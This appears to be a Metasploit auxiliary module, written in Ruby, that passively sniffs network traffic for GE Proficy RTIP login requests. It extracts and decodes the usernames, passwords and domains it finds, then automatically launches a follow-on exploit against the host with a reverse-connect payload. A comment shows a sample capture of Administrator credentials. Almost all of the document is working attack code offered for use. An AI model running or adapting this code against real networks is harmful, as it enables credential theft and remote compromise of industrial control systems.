GE Proficy Real Time Information Portal Credentials Leak Sniffer (meta)
=======================================================================

##
# $Id: rtipsniff.rb 
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#
# MacbookPro:metasploit kfinisterre$ cd /Users/kfinisterre/Desktop/metasploit; sudo ./msfcli auxiliary/test/rtipsniff INTERFACE=en1  E
# [*] Opening the network interface...
# [*] Sniffing RTIP login requests...
# [*] Proficy RTIP Credentials -> user: Administrator pass: This was base64 encoded domain: ProficySniffTest
#
# 
#


require &#039;msf/core&#039;


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Capture
	
	def initialize
		super(
			&#039;Name&#039;        => &#039;GE Proficy Real Time Information Portal Credentials Leak&#039;,
			&#039;Version&#039;     => &#039;$Revision: 1 $&#039;,
			&#039;Description&#039; => &#039;This module sniffs RTIP login requests from the network&#039;,
			&#039;Author&#039;      => [&#039;hdm&#039;,&#039;kf&#039;],
			&#039;License&#039;     => MSF_LICENSE,
			&#039;Actions&#039;     =>
				[
				 	[ &#039;Sniffer&#039; ]
				],
			&#039;PassiveActions&#039; => 
				[
					&#039;Sniffer&#039;
				],
			&#039;DefaultAction&#039;  => &#039;Sniffer&#039;
		)
		register_options([
                        OptAddress.new(&#039;LHOST&#039;, [true, &#039;The IP address to use for reverse-connect payloads&#039;]),
                        OptPort.new(&#039;LPORT&#039;, [false, &#039;The starting TCP port number for reverse-connect payloads&#039;, 4444])
                ], self.class)
	end

        def init_hooked_on_fanucs(name,user,pass,domain, rhost, targ = 0)
                targ ||= 0
                sploit = framework.modules.create(name)
                
                sploit.datastore[&#039;USERNAME&#039;]   = user
                sploit.datastore[&#039;PASSWORD&#039;]   = pass
                sploit.datastore[&#039;DOMAIN&#039;]   = domain
                sploit.datastore[&#039;RHOST&#039;]   = rhost
                sploit.datastore[&#039;LPORT&#039;]   = datastore[&#039;LPORT&#039;]
                sploit.datastore[&#039;LHOST&#039;]   = datastore[&#039;LHOST&#039;]
                sploit.exploit_simple(
                        &#039;LocalInput&#039;     => self.user_input,
                        &#039;LocalOutput&#039;    => self.user_output,
                        &#039;Target&#039;         => targ,
                        &#039;Payload&#039;        => payload,
                        &#039;RunAsJob&#039;       => true)
        end
                

	def run
		username = "a", password = "b", domain = "c"

		print_status("Opening the network interface...")
		open_pcap()

		print_status("Sniffing RTIP login requests...")
		each_packet() do |pkt|
			next if not pkt.tcp?
			
                        if (pkt.payload =~ /\x56\x5d\x72\x2b\x30\xd7\xf2\xc6\x74/)

                                marker = "\x56\x5d\x72\x2b\x30\xd7\xf2\xc6\x74"
                                data = pkt.payload
 
                                credentials = data.split(marker)[1].split("\x00")  
                                username = credentials[1]
                                password = credentials[2]
                                domain = credentials[3].split("\x01")[0]
                                username = username[1..(username.length-2)]
                                password = password[1..(password.length-2)].unpack("m")
                                domain = domain[1..(domain.length-2)]
                                print_status("Proficy RTIP Credentials -> user: #{username} pass: #{password} domain: #{domain} ip: #{pkt.ip_daddr}")
				
			        init_hooked_on_fanucs(&#039;exploit/windows/misc/hooked_on_fanucs&#039;,"#{username}","#{password}","#{domain}", "#{pkt.ip_daddr}")
                        end
			
			true
		end
		
		print_status("Finished sniffing")
	end
	
end



